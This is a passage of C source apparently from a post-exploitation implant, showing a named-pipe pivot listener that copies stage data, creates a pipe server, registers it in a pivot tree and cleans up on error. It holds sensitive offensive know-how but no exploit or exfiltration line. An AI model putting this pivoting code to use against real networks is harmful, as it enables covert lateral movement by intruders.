			memcpy(ctx->stage_data, stageData, ctx->stage_data_size);
		}

		// Default to invalid handle.
		ctx->pipe = INVALID_HANDLE_VALUE;

		_snprintf_s(ctx->name, PIPE_NAME_SIZE, PIPE_NAME_SIZE - 1, "\\\\%s\\pipe\\%s", namedPipeServer, namedPipeName);

		dwResult = create_pipe_server_instance(ctx);

		dprintf("[NP-SERVER] creation of the named pipe returned: %d 0x%x", dwResult, dwResult);

		if (dwResult == ERROR_SUCCESS)
		{
			dprintf("[NP-SERVER] request_net_named_pipe_server_channel_open. named pipe server %s", namedPipeName);
			PivotContext* pivotCtx = (PivotContext*)calloc(1, sizeof(PivotContext));
			pivotCtx->state = ctx;
			pivotCtx->remove = remove_listener;
			pivot_tree_add(remote->pivot_listeners, pivotId, pivotCtx);
#ifdef DEBUGTRACE
			dprintf("[PIVOTTREE] Pivot listeners (after new one added)");
			dbgprint_pivot_tree(remote->pivot_listeners);
#endif
		}

	} while (0);

	packet_transmit_response(dwResult, remote, response);

	do
	{
		if (dwResult == ERROR_SUCCESS)
		{
			break;
		}

		dprintf("[NP-SERVER] Error encountered %u 0x%x", dwResult, dwResult);

		if (!ctx)
		{
			break;
		}

		if (ctx->write_lock != NULL)
		{
			lock_destroy(ctx->write_lock);
		}

		if (ctx->read_overlap.hEvent != NULL)
		{
			dprintf("[NP-SERVER] Destroying wait handle");
			CloseHandle(ctx->read_overlap.hEvent);
		}

		if (ctx->pipe != NULL && ctx->pipe != INVALID_HANDLE_VALUE)
		{
			dprintf("[NP-SERVER] Destroying pipe");
			CloseHandle(ctx->pipe);
		}

		free(ctx);

	} while (0);

	return dwResult;
}
